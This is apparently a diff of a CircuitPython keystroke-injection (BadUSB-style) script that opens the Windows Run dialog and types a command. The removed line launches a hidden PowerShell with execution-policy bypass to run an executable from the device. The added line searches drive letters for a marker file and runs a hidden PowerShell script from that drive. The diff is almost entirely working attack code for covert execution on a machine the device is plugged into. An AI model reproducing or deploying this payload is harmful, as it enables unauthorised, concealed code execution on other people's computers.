@@ -20,7 +20,7 @@ def type_and_enter(text, delay=0.5):
 kbd.send(Keycode.GUI, Keycode.R)
 time.sleep(1.2)
 
-cmd = 'powershell -w h -ep bypass -c "$d=(Get-Volume -FileSystemLabel CIRCUITPY).DriveLetter; if($d){Start-Process ($d+\':\\run.exe\') -WindowStyle Hidden}"'
+cmd = 'cmd /c for %d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do @if exist %d:\.filename start powershell -w h -ep bypass -f "%d:\\filename.ps1"'
 
 type_and_enter(cmd)
 
